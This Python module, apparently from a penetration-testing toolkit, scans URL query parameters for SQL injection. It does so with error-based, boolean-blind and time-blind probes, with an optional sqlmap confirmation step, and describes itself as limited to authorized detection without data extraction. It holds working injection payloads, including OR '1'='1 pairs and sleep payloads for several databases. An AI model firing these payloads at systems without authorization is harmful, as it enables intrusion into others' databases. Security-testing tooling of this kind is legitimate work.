"""
tbhm_addons.mod_sqli
====================

SQL injection DETECTION module for authorized testing.

Engine: native Python (requests) first, sqlmap as an optional confirmation
fallback. Native layer covers:
  * error-based        (DB error signatures in the response)
  * boolean-blind      (TRUE vs FALSE payload → response differential)
  * time-blind         (sleep payload → measurable latency delta)

Design constraints for an authorized engagement:
  * DETECTION, not data exfiltration. The native layer proves a parameter is
    injectable; it does not dump tables. If the client authorizes extraction,
    that is done deliberately via the sqlmap fallback with explicit flags —
    not automated here.
  * Every request is logged (argv-equivalent = method+url+param+payload) so a
    finding is reproducible.
  * Low and slow: single-threaded, configurable delay, small payload set.
  * Canary-first: benign marker probes before any boolean/time logic.

Integration: `run(target, logger_phase, ...)` takes a PhaseLogger from
logging_core so all traffic lands in the run's logs. Standalone-safe: if no
logger is passed it uses a no-op shim.
"""

from __future__ import annotations

import time
import shutil
import statistics
import subprocess
from dataclasses import dataclass, field, asdict
from typing import Any, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

try:
    import requests
except ImportError:  # keep import-safe on a box without requests
    requests = None  # type: ignore


# DB error signatures — presence indicates the input reached a SQL parser.
_ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysqli",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "sqlstate[",
    "psql: error",
    "pg_query()",
    "ora-00933", "ora-01756", "ora-00921",
    "sqlite3.operationalerror",
    "microsoft odbc",
    "odbc sql server driver",
    "syntax error at or near",
    "supplied argument is not a valid mysql",
]

# Boolean pair: a condition that is always TRUE vs always FALSE. A parameter is
# likely injectable if TRUE looks like baseline and FALSE differs (or vice
# versa). Single quote and numeric variants included.
_BOOLEAN_PAIRS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
    (" AND 1=1", " AND 1=2"),
    ("' OR '1'='1", "' OR '1'='2"),
]

# Time payloads per-DB. Kept to a single sleep of `delay_s` seconds.
def _time_payloads(delay_s: int) -> list[str]:
    d = delay_s
    return [
        f"' AND SLEEP({d})-- -",                       # MySQL
        f"'; WAITFOR DELAY '0:0:{d}'-- -",             # MSSQL
        f"' AND pg_sleep({d})-- -",                    # Postgres
        f"' AND {d}=DBMS_LOCK.SLEEP({d})-- -",         # Oracle-ish
        f" AND SLEEP({d})",                            # numeric MySQL
    ]

_ERROR_PROBES = ["'", "\"", "')", "';", "\"))", "`"]


class _NoopPhase:
    """Stand-in when no logger phase is supplied (standalone use)."""
    def event(self, *a: Any, **k: Any) -> None: ...
    def tool(self, *a: Any, **k: Any) -> None: ...
    def fail(self, *a: Any, **k: Any) -> None: ...


@dataclass
class SqliFinding:
    url: str
    parameter: str
    method: str
    technique: str            # error | boolean | time
    evidence: str
    payload: str
    confidence: str           # firm | tentative
    baseline_len: int = 0
    variant_len: int = 0
    latency_delta_s: float = 0.0


@dataclass
class SqliResult:
    target: str
    tested_parameters: list[str] = field(default_factory=list)
    findings: list[SqliFinding] = field(default_factory=list)
    sqlmap_ran: bool = False
    sqlmap_summary: str = ""
    errors: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        d = asdict(self)
        d["findings"] = [asdict(f) for f in self.findings]
        return d


class SqliModule:
    def __init__(
        self,
        delay_between_requests: float = 1.0,
        time_delay_s: int = 5,
        timeout: int = 20,
        user_agent: str = "AuthorizedSecurityTest/1.0",
        verify_tls: bool = False,
    ) -> None:
        self.req_delay = delay_between_requests
        self.time_delay_s = time_delay_s
        self.timeout = timeout
        self.ua = user_agent
        self.verify_tls = verify_tls

    # -- helpers ------------------------------------------------------------
    def _get(self, url: str) -> tuple[int, str, float]:
        assert requests is not None
        headers = {"User-Agent": self.ua}
        t0 = time.monotonic()
        r = requests.get(url, headers=headers, timeout=self.timeout,
                         verify=self.verify_tls, allow_redirects=True)
        dt = time.monotonic() - t0
        return r.status_code, r.text, dt

    @staticmethod
    def _swap_param(url: str, param: str, value: str) -> str:
        parts = urlparse(url)
        q = parse_qs(parts.query, keep_blank_values=True)
        q[param] = [value]
        new_q = urlencode({k: v[0] for k, v in q.items()})
        return urlunparse(parts._replace(query=new_q))

    # -- main ---------------------------------------------------------------
    def run(self, target_url: str, phase: Any = None,
            run_sqlmap_on_hit: bool = False) -> SqliResult:
        """Test every query-string parameter of target_url for SQLi.

        phase: a PhaseLogger from logging_core (or None for standalone).
        run_sqlmap_on_hit: if True and sqlmap is installed, run it as
            confirmation on the first firm hit. sqlmap flags are conservative
            (level/risk 1, single thread, delay) and do NOT dump data.
        """
        ph = phase or _NoopPhase()
        res = SqliResult(target=target_url)

        if requests is None:
            res.errors.append("requests not installed; native engine disabled")
            ph.fail("requests missing", RuntimeError("no requests module"))
            return res

        parts = urlparse(target_url)
        params = list(parse_qs(parts.query, keep_blank_values=True).keys())
        res.tested_parameters = params
        ph.event("scope", f"parameters to test: {params or 'NONE'}",
                 url=target_url, params=params)

        if not params:
            res.errors.append("no query parameters to test on this URL")
            return res

        # baseline once per param (params may interact, so re-baseline each)
        for param in params:
            try:
                self._test_param(target_url, param, ph, res)
            except Exception as exc:  # noqa: BLE001
                ph.fail(f"parameter test crashed: {param}", exc,
                        url=target_url, param=param)
                res.errors.append(f"{param}: {exc}")

        # sqlmap confirmation
        firm = [f for f in res.findings if f.confidence == "firm"]
        if run_sqlmap_on_hit and firm:
            self._sqlmap_confirm(target_url, firm[0].parameter, ph, res)

        return res

    def _test_param(self, url: str, param: str, ph: Any,
                    res: SqliResult) -> None:
        base_code, base_body, _ = self._get(url)
        base_len = len(base_body)
        ph.event("baseline", f"param={param} len={base_len} code={base_code}",
                 param=param, baseline_len=base_len)
        time.sleep(self.req_delay)

        # 1) error-based
        for probe in _ERROR_PROBES:
            mutated = self._swap_param(url, param, "1" + probe)
            code, body, _ = self._get(mutated)
            ph.tool("http.get", ["GET", mutated], returncode=code,
                    stdout_tail=body[:200])
            low = body.lower()
            hit = next((s for s in _ERROR_SIGNATURES if s in low), None)
            if hit:
                res.findings.append(SqliFinding(
                    url=url, parameter=param, method="GET",
                    technique="error", evidence=f"DB error signature: {hit!r}",
                    payload="1" + probe, confidence="firm",
                    baseline_len=base_len, variant_len=len(body)))
                ph.event("finding", f"error-based SQLi on {param}",
                         param=param, signature=hit)
                return  # one firm technique is enough per param
            time.sleep(self.req_delay)

        # 2) boolean-blind
        for true_p, false_p in _BOOLEAN_PAIRS:
            t_url = self._swap_param(url, param, "1" + true_p)
            f_url = self._swap_param(url, param, "1" + false_p)
            _, t_body, _ = self._get(t_url); time.sleep(self.req_delay)
            _, f_body, _ = self._get(f_url); time.sleep(self.req_delay)
            tl, fl = len(t_body), len(f_body)
            ph.tool("http.get", ["GET", t_url], stdout_tail=f"len={tl}")
            ph.tool("http.get", ["GET", f_url], stdout_tail=f"len={fl}")
            # TRUE close to baseline, FALSE materially different → injectable
            if tl != fl and (abs(tl - base_len) < abs(fl - base_len)):
                delta = abs(tl - fl)
                # require a non-trivial differential to cut noise
                if delta > max(20, int(0.02 * max(base_len, 1))):
                    res.findings.append(SqliFinding(
                        url=url, parameter=param, method="GET",
                        technique="boolean",
                        evidence=f"TRUE/FALSE length differential {tl} vs {fl}",
                        payload=f"TRUE={true_p!r} FALSE={false_p!r}",
                        confidence="firm", baseline_len=base_len,
                        variant_len=tl))
                    ph.event("finding", f"boolean-blind SQLi on {param}",
                             param=param, true_len=tl, false_len=fl)
                    return

        # 3) time-blind (most expensive, last)
        # measure baseline latency twice to set a threshold
        lat_samples = []
        for _ in range(2):
            _, _, dt = self._get(url); lat_samples.append(dt)
            time.sleep(self.req_delay)
        base_lat = statistics.mean(lat_samples)
        threshold = base_lat + (self.time_delay_s * 0.6)  # 60% of sleep
        for payload in _time_payloads(self.time_delay_s):
            m_url = self._swap_param(url, param, "1" + payload)
            try:
                _, _, dt = self._get(m_url)
            except Exception:
                continue
            ph.tool("http.get", ["GET", m_url], stdout_tail=f"latency={dt:.2f}s")
            if dt >= threshold:
                # confirm once to reduce false positive from a slow request
                _, _, dt2 = self._get(m_url)
                if dt2 >= threshold:
                    res.findings.append(SqliFinding(
                        url=url, parameter=param, method="GET",
                        technique="time",
                        evidence=(f"latency {dt:.2f}s/{dt2:.2f}s vs base "
                                  f"{base_lat:.2f}s, sleep={self.time_delay_s}s"),
                        payload=payload, confidence="firm",
                        latency_delta_s=round(dt - base_lat, 2)))
                    ph.event("finding", f"time-blind SQLi on {param}",
                             param=param, latency=round(dt, 2))
                    return
            time.sleep(self.req_delay)

    def _sqlmap_confirm(self, url: str, param: str, ph: Any,
                        res: SqliResult) -> None:
        sqlmap = shutil.which("sqlmap")
        if not sqlmap:
            res.errors.append("sqlmap not found on PATH; skipped confirmation")
            ph.event("sqlmap", "not installed, skipping")
            return
        argv = [
            sqlmap, "-u", url, "-p", param,
            "--batch", "--level", "1", "--risk", "1",
            "--threads", "1", "--delay", "1",
            "--technique", "BEUST",   # detection techniques, no dumping flags
            "--flush-session",
        ]
        res.sqlmap_ran = True
        try:
            cp = subprocess.run(argv, capture_output=True, text=True,
                                timeout=600)
            ph.tool("sqlmap", argv, returncode=cp.returncode,
                    stdout_tail=cp.stdout or "", stderr_tail=cp.stderr or "")
            tail = (cp.stdout or "")[-1500:]
            res.sqlmap_summary = tail
        except Exception as exc:  # noqa: BLE001
            ph.fail("sqlmap confirmation failed", exc, argv=argv)
            res.errors.append(f"sqlmap: {exc}")


# -- standalone smoke test (no network; validates URL plumbing only) --------
if __name__ == "__main__":
    m = SqliModule()
    test = "https://example.test/item.php?id=1&cat=books"
    # exercise param parsing + swap without hitting the network
    print("params:", list(parse_qs(urlparse(test).query).keys()))
    print("swap id->payload:",
          m._swap_param(test, "id", "1' AND '1'='1"))
    print("error signatures loaded:", len(_ERROR_SIGNATURES))
    print("boolean pairs:", len(_BOOLEAN_PAIRS))
    print("time payloads:", len(_time_payloads(5)))
